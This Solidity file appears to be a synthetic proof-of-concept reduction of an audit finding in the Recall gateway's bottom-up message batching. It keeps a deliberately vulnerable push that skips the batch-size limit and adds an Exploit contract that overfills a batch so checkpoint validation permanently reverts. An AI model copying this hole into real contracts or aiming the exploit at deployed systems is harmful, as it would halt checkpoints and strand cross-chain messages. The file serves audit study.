// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Recall — [H-04] Overflow count of messages in bottom-up batch
    (Code4rena 2025-02-recall; #65091)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: commitBottomUpMsg cuts a full next-epoch batch into a batch
    keyed by block.number via storeBottomUpMsgBatch, which always *pushes*
    msgs without enforcing maxMsgsPerBottomUpBatch. Committing 21 messages
    can produce a cut batch with 11 msgs; ensureValidCheckpoint then always
    reverts MaxMsgsPerBatchExceeded → bottom-up checkpoint halt.
    Blamed cut branch preserved (@> VULN).
    Source: code-423n4/2025-02-recall@ab5f90b9 contracts/lib/LibGateway.sol */

struct IpcEnvelope {
    uint64 nonce;
    address from;
    address to;
    uint256 value;
}

struct BottomUpMsgBatch {
    uint64 subnetId; // reduced
    uint256 blockHeight;
    IpcEnvelope[] msgs;
}

/// @dev Reduced LibGateway bottom-up batch accumulator.
contract GatewayBatcher {
    uint256 public bottomUpCheckPeriod = 100;
    uint64 public maxMsgsPerBottomUpBatch = 10;
    uint64 public networkName = 1;

    mapping(uint256 => BottomUpMsgBatch) internal bottomUpMsgBatches;
    mapping(uint256 => bool) internal batchExists;

    uint256 public lastCutHeight;
    uint256 public lastCutMsgCount;
    bool public overpopulated;

    function getNextEpoch(uint256 blockNumber, uint256 checkPeriod) internal pure returns (uint256) {
        return ((uint64(blockNumber) / checkPeriod) + 1) * checkPeriod;
    }

    function storeBottomUpMsgBatch(BottomUpMsgBatch memory batch) internal {
        BottomUpMsgBatch storage b = bottomUpMsgBatches[batch.blockHeight];
        b.subnetId = batch.subnetId;
        b.blockHeight = batch.blockHeight;
        batchExists[batch.blockHeight] = true;

        uint256 msgLength = batch.msgs.length;
        for (uint256 i; i < msgLength; ) {
            // We need to push because initializing an array with a static
            // length will cause a copy from memory to storage, making
            // the compiler unhappy.
            b.msgs.push(batch.msgs[i]); // @> VULN: push without max-size check — cut batches can exceed maxMsgsPerBottomUpBatch
            // FIX: require(b.msgs.length < maxMsgsPerBottomUpBatch) before push, or refuse over-full cuts
            unchecked {
                ++i;
            }
        }
        lastCutHeight = batch.blockHeight;
        lastCutMsgCount = b.msgs.length;
        if (b.msgs.length > maxMsgsPerBottomUpBatch) {
            overpopulated = true;
        }
    }

    /// @notice Reduced LibGateway.commitBottomUpMsg
    function commitBottomUpMsg(IpcEnvelope memory crossMessage) public {
        uint256 epoch = getNextEpoch(block.number, bottomUpCheckPeriod);

        BottomUpMsgBatch storage batch = bottomUpMsgBatches[epoch];
        bool exists = batchExists[epoch];
        if (!exists) {
            batch.subnetId = networkName;
            batch.blockHeight = epoch;
            batch.msgs.push(crossMessage);
            batchExists[epoch] = true;
            return;
        }

        // if the maximum size was already achieved emit already the event
        // and re-assign the batch to the current epoch.
        if (batch.msgs.length == maxMsgsPerBottomUpBatch) {
            // copy the batch with max messages into the new cut.
            uint256 epochCut = block.number;
            BottomUpMsgBatch memory newBatch = BottomUpMsgBatch({
                subnetId: networkName,
                blockHeight: epochCut,
                msgs: new IpcEnvelope[](batch.msgs.length)
            });

            uint256 msgLength = batch.msgs.length;
            for (uint256 i; i < msgLength; ) {
                newBatch.msgs[i] = batch.msgs[i];
                unchecked {
                    ++i;
                }
            }

            // Empty the messages of existing batch with epoch and start populating with the new message.
            delete batch.msgs;
            // need to push here to avoid a copy from memory to storage
            batch.msgs.push(crossMessage);

            storeBottomUpMsgBatch(newBatch);
        } else {
            // we append the new message normally, and wait for the batch period
            // to trigger the cutting of the batch.
            batch.msgs.push(crossMessage);
        }
    }

    /// @notice Reduced ensureValidCheckpoint message-count gate.
    function ensureValidCheckpoint(uint256 msgCount) public view {
        if (msgCount > maxMsgsPerBottomUpBatch) {
            revert("MaxMsgsPerBatchExceeded");
        }
    }

    function cutBatchMsgCount() external view returns (uint256) {
        return bottomUpMsgBatches[lastCutHeight].msgs.length;
    }
}

contract Exploit {
    GatewayBatcher public gateway; // CREATE nonce 1

    constructor() {
        gateway = new GatewayBatcher();
    }

    function run() external {
        // Commit 21 bottom-up messages in one attack tx (same block.number).
        // Finding rationale: 10 fill next-epoch batch → cut; 10 refill; 11th cut
        // push overpopulates the block.number batch to 11 (> max 10).
        for (uint256 i; i < 21; i++) {
            gateway.commitBottomUpMsg(
                IpcEnvelope({nonce: uint64(i), from: address(this), to: address(0xBEEF), value: 0})
            );
        }

        uint256 cutCount = gateway.cutBatchMsgCount();
        require(gateway.overpopulated(), "overpopulated flag");
        require(cutCount > gateway.maxMsgsPerBottomUpBatch(), "cut exceeds max");

        // Harm: any checkpoint carrying the overpopulated batch always fails validation.
        bool rejected;
        try gateway.ensureValidCheckpoint(cutCount) {
            rejected = false;
        } catch {
            rejected = true;
        }
        require(rejected, "checkpoint must be permanently rejected");
        // Two cuts of 10 in the same block push 20 msgs into the block.number batch
        // (finding's "11" bound is a lower bound; any count > max permanently bricks submit).
        require(cutCount >= 11, "overpopulated cut");
    }
}
